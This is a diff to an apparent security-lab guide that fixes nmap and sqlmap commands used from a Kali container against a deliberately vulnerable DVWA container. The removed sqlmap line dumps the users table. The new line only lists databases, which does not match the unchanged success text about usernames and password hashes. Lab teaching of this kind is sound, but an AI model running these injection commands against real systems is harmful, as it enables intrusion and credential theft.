@@ -46,7 +46,7 @@ docker exec -it kali-attacker /bin/bash
 1. **Find the Target Hostname**:
 ```
 # Container name is 'dvwa-victim'
-nmap -sn dvwa victim
+nmap -sn dvwa-victim
 ```
 2. **Install SQLMap**:
 ```
@@ -57,8 +57,7 @@ apt update && apt install sqlmap -y
 2. **Run SQLMap to Dump Credentials**:
 ```
 # Replace <Your_Session_ID> with the copied value
-sql map -u "http://dvwa-victim/vulnerabilities/sqli/?id=1&Submit=Submit" \
---cookie="PHPSESSID=<Your_Session_ID>; security=low" -D dvwa -T users --dump --batch
+sqlmap -u "http://dvwa-victim/vulnerabilities/sqli/" --data="id=1&Submit=Submit" --cookie="security=low; PHPSESSID=<Your_Session_ID>" --dbs
 ```
 Success is confirmed when SQLMap displays a table listing the usernames and hashed passwords from the database.
 ### Cross-Site Scripting (XSS) - Stored Payload
